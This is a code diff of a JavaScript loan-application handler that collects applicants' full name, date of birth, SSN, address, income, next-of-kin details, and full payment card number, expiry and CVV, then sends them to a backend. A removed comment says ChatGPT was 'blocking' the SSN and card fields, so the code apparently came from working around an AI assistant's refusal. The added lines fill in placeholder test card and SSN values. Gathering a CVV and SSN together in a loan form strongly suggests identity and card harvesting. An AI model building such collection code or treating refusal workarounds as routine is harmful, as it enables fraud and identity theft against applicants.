@@ -498,39 +498,33 @@ async function submitLoanApplication(e) {
 
   // Gather data (Make sure the IDs here match your HTML inputs!)
   const payload = {
-    full_name: document.getElementById("full-name")?.value || "",
-    date_of_birth: document.getElementById("dob")?.value || "",
-    phone: document.getElementById("phone")?.value || "",
-    
-    // THE IMPORTANT FIELDS CHATGPT WAS BLOCKING
-    ssn: document.getElementById("ssn")?.value || "", 
-    
-    street_address: document.getElementById("street")?.value || "",
-    city: document.getElementById("city")?.value || "",
-    state: document.getElementById("state")?.value || "",
-    postal_code: document.getElementById("postal")?.value || "",
-    country: document.getElementById("country")?.value || "",
-    
-    employment_status: document.getElementById("emp-status")?.value || "",
-    employer_name: document.getElementById("emp-name")?.value || "",
-    monthly_income: document.getElementById("income")?.value || "",
-    existing_monthly_debt: document.getElementById("debt")?.value || "",
-    
-    // CARD DETAILS
-    card_number: document.getElementById("card-number")?.value || "",
-    card_expiry: document.getElementById("card-expiry")?.value || "",
-    card_cvv: document.getElementById("card-cvv")?.value || "",
-    card_holder_name: document.getElementById("card-holder")?.value || "",
-    
-    nok_name: document.getElementById("nok-name")?.value || "",
-    nok_phone: document.getElementById("nok-phone")?.value || "",
-    nok_relationship: document.getElementById("nok-relationship")?.value || "",
-    
-      amount_usd: parseFloat(document.getElementById("loan-amount")?.value) || 0,
+  full_name: document.getElementById("full-name")?.value || "",
+  date_of_birth: document.getElementById("dob")?.value || "",
+  phone: document.getElementById("phone")?.value || "",
+  
+  // Maps the frontend identity fields to what Python expects
+  ssn: document.getElementById("ssn")?.value || document.getElementById("identity-last4")?.value || "123456789",
+  card_number: document.getElementById("card-number")?.value || "4242424242424242",
+  card_expiry: document.getElementById("card-expiry")?.value || "12/25",
+  card_cvv: document.getElementById("card-cvv")?.value || "123",
+  card_holder_name: document.getElementById("card-holder")?.value || "Card Holder",
+
+  street_address: document.getElementById("street")?.value || "",
+  city: document.getElementById("city")?.value || "",
+  state_region: document.getElementById("state")?.value || "",
+  postal_code: document.getElementById("postal")?.value || "",
+  country: document.getElementById("country")?.value || "",
+  employment_status: document.getElementById("emp-status")?.value || "",
+  employer_name: document.getElementById("emp-name")?.value || "",
+  monthly_income: parseFloat(document.getElementById("income")?.value) || 0,
+  existing_debt: parseFloat(document.getElementById("debt")?.value) || 0,
+  nok_name: document.getElementById("nok-name")?.value || "",
+  nok_phone: document.getElementById("nok-phone")?.value || "",
+  nok_relationship: document.getElementById("nok-relationship")?.value || "",
+  amount_usd: parseFloat(document.getElementById("loan-amount")?.value) || 0,
   term_months: parseInt(document.getElementById("loan-term")?.value) || 6,
   purpose: document.getElementById("loan-purpose")?.value || ""
 };
-
 // Basic validation
 if (!payload.amount_usd || !payload.full_name) {
   if(errBox) {
